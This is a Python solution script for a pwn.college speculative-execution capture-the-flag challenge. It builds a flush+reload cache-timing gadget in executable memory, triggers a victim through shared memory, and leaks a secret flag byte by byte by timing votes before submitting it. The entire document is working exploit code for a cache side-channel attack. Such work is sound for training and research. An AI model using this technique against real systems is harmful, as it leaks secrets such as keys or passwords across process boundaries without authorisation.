#!/nix/store/cdaifv92znxy5ai4sawricjl0p5b9sgf-python3-3.13.11/bin/python3.13
# Microarchitecture Exploitation - Baby Spectre 3
# https://pwn.college/system-security/speculative-execution/babyarch-measuretiming
import ctypes
import mmap
import os
import site
import sys
import time

site.addsitedir(
    "/nix/store/8rkdh1mj5w4ysz03j9n5xcdamcwrdwjd-python3-3.13.11-env/lib/python3.13/site-packages"
)
import pwn
from dojotool import find_challenge, submit, tee


def inside_challenge() -> None:
    SHM = 0x1337000
    PROBE = SHM + 0x1000
    PAGE_COUNT = 0x100
    THRESHOLD = 0xE6

    index = ctypes.c_int.from_address(SHM + 32)
    sem_post = ctypes.CDLL(None).sem_post

    code = pwn.asm("""
        rdtsc
        mov r8, rax
        mov al, byte ptr [rdi]
        rdtscp
        sub rax, r8
        clflush byte ptr [rdi]
        mfence
        ret
    """)
    buf = mmap.mmap(-1, len(code), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    buf.write(code)
    flush_reload = ctypes.CFUNCTYPE(ctypes.c_uint64, ctypes.c_void_p)(
        ctypes.addressof(ctypes.c_char.from_buffer(buf))
    )

    def get_timing_data() -> list[int]:        
        return [flush_reload(PROBE + i * 0x1000) for i in range(PAGE_COUNT)]

    def trigger(pos: int):
        index.value = pos
        sem_post(SHM)
        time.sleep(0.0001)

    def leak_byte(pos: int) -> int:
        votes = [0] * PAGE_COUNT
        for _ in range(7):
            get_timing_data()
            trigger(pos)
            for i, t in enumerate(get_timing_data()):
                if t < THRESHOLD:
                    votes[i] += 1

        leaked = max(range(PAGE_COUNT), key=lambda i: votes[i])
        return leaked

    flag = bytearray()
    for pos in range(64):
        leaked = leak_byte(pos)
        if not chr(leaked).isprintable():
            continue

        flag.append(leaked)
        print(f"[{pos:2d}] 0x{leaked:02x} '{chr(leaked)}'", flush=True)
        if leaked == ord("}"):
            break

    flag = flag.decode()
    print("FLAG:", flag)
    if "pwn.college" in flag:
        submit(flag)

    sem_post(SHM)
    os._exit(0)


def ctf() -> None:
    os.chmod(__file__, 0o755)
    with pwn.process([find_challenge(), __file__], raw=True, level="error") as io:
        tee(io)
        io.recvrepeat()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ctf()
    else:
        inside_challenge()
